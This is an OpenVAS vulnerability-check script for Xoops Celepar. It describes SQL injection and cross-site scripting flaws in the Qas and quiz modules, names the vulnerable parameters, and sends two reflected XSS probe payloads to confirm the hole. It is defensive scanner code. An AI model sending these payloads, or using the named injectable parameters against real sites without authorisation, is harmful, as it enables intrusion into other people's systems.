##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xoops_celepar_mult_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Xoops Celepar Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary SQL
  statements on the vulnerable system, which may allow an attacker to view, add,
  modify data, or delete information in the back-end database and also conduct
  cross-site scripting.
  Impact Level: Application.";
tag_affected = "Xoops Celepar module 2.2.4 and prior";

tag_insight = "- The flaw exists in 'Qas (aka Quas) module'. Input passed to the 'codigo'
    parameter in modules/qas/aviso.php and modules/qas/imprimir.php, and the
    'cod_categoria' parameter in modules/qas/categoria.php is not properly
    sanitised before being used in an SQL query.
  - The flaw exists in 'Qas (aka Quas) module' and 'quiz'module. Input passed
    to the 'opcao' parameter to modules/qas/index.php, and via the URL to
    modules/qas/categoria.php, modules/qas/index.php, and
    modules/quiz/cadastro_usuario.php is not properly sanitised before being
    returned to the user.";
tag_solution = "No solution or patch is available as of 17th March 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.xoops.pr.gov.br/modules/core/singlefile.php?cid=13&lid=30";
tag_summary = "This host is running Xoops Celepar and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(801153);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-03-23 15:59:14 +0100 (Tue, 23 Mar 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_bugtraq_id(35820);
  script_cve_id("CVE-2009-4698", "CVE-2009-4713", "CVE-2009-4714");
  script_name("Xoops Celepar Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/56597");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/35966");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9249");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9261");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/51985");

  script_description(desc);
  script_summary("Check through the attack string on Xoops Celepar");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_xoops_celepar_detect.nasl");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");

## Get HTTP port
xoopsPort = get_http_port(default:80);
if(!xoopsPort){
  exit(0);
}

## Get Xoops Celepar version from KB
celeparVer = get_kb_item("www/" + xoopsPort + "/XoopsCelepar");
if(!celeparVer){
  exit(0);
}

celeparVer = eregmatch(pattern:"^(.+) under (/.*)$", string:celeparVer);

## Check for QAS module in Xoops Celepar
sndReq = http_get(item:string(celeparVer[2], "/modules/qas/index.php"),
                  port:xoopsPort);
rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

## Confirm QAS module is installed
if("200 OK" >< rcvRes && "_MI_QAS_POR"  >< rcvRes)
{
  ## Send an exploit to QAS module and recieve the response
  sndReq = http_get(item:string(celeparVer[2], "/modules/qas/categoria.php?" +
                    "cod_categoria='><script>alert('OpenVAS-XSS-Exploit');"+
                    "</script>"),
                     port:xoopsPort);
  rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

  ## Check the response for XSS
  if("OpenVAS-XSS-Exploit" >< rcvRes)
  {
    security_hole(xoopsPort);
    exit(0);
  }
}

## Check for Quiz module in Xoops Celepar
sndReq = http_get(item:string(celeparVer[2], "/modules/quiz/login.php"),
                  port:xoopsPort);
rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

## Confirm Quiz module is installed
if("200 OK" >< rcvRes && "Quiz:"  >< rcvRes)
{
  ## Send an exploit to Quiz module and recieve the response
  sndReq = http_get(item:string(celeparVer[2], "/module/quiz/" +
                    "cadastro_usuario.php/>'><ScRiPt>alert" +
                    "('OpenVAS-XSS-Exploit');</ScRiPt>"),
                     port:xoopsPort);
  rcvRes = http_send_recv(port:xoopsPort, data:sndReq);

  ## Check the response for XSS
  if("OpenVAS-XSS-Exploit" >< rcvRes)
  {
    security_hole(xoopsPort);
    exit(0);
  }
}
